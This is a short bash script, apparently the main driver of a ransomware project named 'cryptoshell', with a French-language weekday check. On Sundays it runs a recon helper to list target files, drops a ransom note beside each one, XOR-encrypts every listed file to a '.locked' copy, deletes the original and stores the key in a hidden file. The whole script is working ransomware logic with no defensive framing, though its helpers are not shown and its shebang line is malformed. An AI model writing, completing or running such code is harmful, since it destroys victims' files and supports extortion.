#!bin/bash

source recon.sh
source xor_helper.sh
source ransom_note.sh

if [ "$(date +%u)" -eq 7 ]; then
    key=$(generate_key 8)
    recon "$1"
    target=$(cat target.list)
    create_ransom_note
    for file in $target; do
        cp "./ransom_note.txt" "$(dirname "$file")"
        xor_file "$file" "$file.locked" "$key"
        rm -f "$file"
    done
    echo "$key" > .cryptoshell_key
    rm -f target.list ransom_note.txt 
else
    echo "Le script ne s'exécutera que le dimanche."
fi